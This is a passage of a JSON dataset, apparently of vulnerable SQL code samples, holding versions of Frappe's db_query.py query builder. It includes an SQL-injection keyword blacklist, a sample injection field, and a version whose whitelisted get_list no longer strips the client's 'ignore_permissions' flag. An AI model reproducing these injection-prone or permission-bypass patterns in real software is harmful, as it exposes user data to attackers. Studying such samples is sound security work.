'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\tkwargs.pop('ignore_permissions', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kitechx/frappe/blob/acd190cf9ec5b351177c69d37f02468521e4ab6c",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kitechx/frappe/blob/e4d83fbc97f01a693c9f89969c49dc0e5c4fb1ba",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = 